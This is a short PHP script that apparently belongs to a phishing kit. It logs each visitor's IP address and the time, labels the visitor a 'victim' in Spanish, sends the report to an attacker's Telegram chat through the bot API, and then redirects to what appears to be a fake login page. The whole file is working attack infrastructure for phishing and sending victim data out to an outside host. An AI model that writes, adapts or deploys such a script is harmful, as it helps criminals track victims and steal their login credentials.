<?php
$token = getenv('TOKEN_BOT');
$id = getenv('ID_CHAT');
$ip = $_SERVER['REMOTE_ADDR'];

if($token && $id) {
    $mensaje = "🌐 *VÍCTIMA EN LÍNEA*\n";
    $mensaje .= "📍 IP: " . $ip . "\n";
    $mensaje .= "🕒 Hora: " . date('Y-m-d H:i:s');
    
    $url = "https://api.telegram.org/bot" . $token . "/sendMessage?chat_id=" . $id . "&text=" . urlencode($mensaje) . "&parse_mode=Markdown";
    @file_get_contents($url);
}

header("Location: ../a/login.php");
?>
